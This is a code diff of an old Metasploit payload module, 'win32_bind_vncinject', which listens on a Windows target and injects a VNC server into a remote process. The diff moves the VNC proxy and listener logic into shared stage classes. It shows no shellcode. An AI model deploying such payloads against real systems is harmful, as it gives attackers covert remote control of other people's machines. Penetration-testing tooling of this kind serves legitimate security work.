@@ -8,143 +8,37 @@
 ##
 
 package Msf::Payload::win32_bind_vncinject;
-use strict;
-use base 'Msf::PayloadComponent::Win32InjectLibStage';
-use FindBin qw{$RealBin};
 
-sub _Load {
-  Msf::PayloadComponent::Win32InjectLibStage->_Import('Msf::PayloadComponent::Win32BindStager');
-  __PACKAGE__->SUPER::_Load();
-}
+use strict;
+use base 'Msf::PayloadComponent::Windows::ia32::InjectVncStage';
+use FindBin qw{$RealBin};
 
 my $info =
 {
-  'Name'         => 'Windows Bind VNC Server DLL Inject',
-  'Version'      => '$Revision$',
-  'Description'  => 'Listen for connection and inject a VNC server into the remote process',
-  'Authors'      => [
-                        'Matt Miller <mmiller [at] hick.org>',
-                        'Jarkko Turkulainen <jt [at] klake.org>',
-                    ],
-  'UserOpts'     => { 
-                        'VNCDLL'  => [1, 'PATH', 'The full path the VNC service dll', "$RealBin/data/vncdll.dll"],
-                        'VNCPORT' => [1, 'PORT', 'The local port to use for the VNC proxy',  5900],
-                        'AUTOVNC' => [1, 'BOOL', 'Automatically launch vncviewer', 1],
-                    },
-                
+	'Name'         => 'Windows Bind VNC Server DLL Inject',
+	'Version'      => '$Revision$',
+	'Description'  => 'Listen for connection and inject a VNC server into the remote process',
 };
 
-sub new {
-  _Load();
-  my $class = shift;
-  my $hash = @_ ? shift : { };
-  $hash = $class->MergeHashRec($hash, {'Info' => $info});
-  my $self = $class->SUPER::new($hash, @_);
-  return($self);
-}
-
-sub _InjectDLL {
-  my $self = shift;
-  return $self->GetVar('VNCDLL');
-}
-
-sub _InjectDLLName
+sub _Load 
 {
-	my $self = shift;
-		
-	return "hax0r.dll"; # randomize me!
+	Msf::PayloadComponent::Windows::ia32::InjectVncStage->_Import('Msf::PayloadComponent::Windows::ia32::BindStager');
+
+	__PACKAGE__->SUPER::_Load();
 }
 
-sub HandleConnection {
-  my $self = shift;
-  my $sock = $self->PipeRemoteOut;
-  $self->SUPER::HandleConnection;
-  sleep(1);
+sub new 
+{
+	my $class = shift;
+	my $hash = @_ ? shift : { };
+	my $self;
 
-  # Create listener socket
-  my $lis = IO::Socket::INET->new(
-    'Proto'     => 'tcp',
-    'ReuseAddr' => 1,
-    'Listen'    => 5,
-    'Blocking'  => 0,
-    'LocalPort' => $self->GetVar('VNCPORT'),
-  );  
-  
-  if (! $lis) {
-    $self->PrintLine("[*] Problem creating the VNC proxy listener: $@");
-    $self->KillChild;    
-    return;  
-  }
-  
-  $self->PrintLine('[*] VNC proxy listening on port '.$lis->sockport.'...');
-  
-  if ($self->GetVar('AUTOVNC')) {
-    my $pid = fork();
-    if (! $pid) {
-        system("vncviewer 127.0.0.1:".$self->GetVar('VNCPORT'));
-        exit(0);
-    }
-  }
-  
-  
-  # Accept connection from user
-  my $sel = IO::Select->new($lis);
-  my $clock = time();
-  my $mwait = 300;
-  my $csock;
-  
-  while (! $csock && time < ($clock+$mwait))
-  {
-    foreach ($sel->can_read(0.25)) { $csock = $lis->accept() }
-  }
-  
-  if (! $csock) {
-    $self->PrintLine('[*] VNC proxy did not recieve connection before timeout');
-    $self->KillChild;    
-    return;
-  } 
-  
-  $self->VNCProxy($sock, $csock);
-  $self->PrintLine('[*] VNC proxy finished');
-  
-  $sock->close;
-  $csock->close;
-  $self->KillChild;
-  return;
-}
+	_Load();
 
-sub VNCProxy {
-  my $self = shift;
-  my $srv = shift;
-  my $cli = shift;
+	$hash = $class->MergeHashRec($hash, {'Info' => $info});
+	$self = $class->SUPER::new($hash, @_);
 
-  foreach ($srv, $cli) {
-    $_->blocking(1);
-    $_->autoflush(1);
-  }
-
-  my $selector = IO::Select->new($srv, $cli);
-
-  LOOPER:
-    while(1) {
-      my @ready = $selector->can_read;
-      foreach my $ready (@ready) {
-        if($ready == $cli) {
-          my $data;
-          $cli->recv($data, 8192);
-          last LOOPER if (! length($data));     
-          last LOOPER if(!$srv || !$srv->connected);
-          $srv->send($data);
-        }
-        elsif($ready == $srv) {
-          my $data;
-          $srv->recv($data, 8192);
-          last LOOPER if(!length($data));
-          last LOOPER if(!$cli || !$cli->connected);
-          $cli->send($data);
-        }
-      }
-    }
+	return($self);
 }
 
 1;
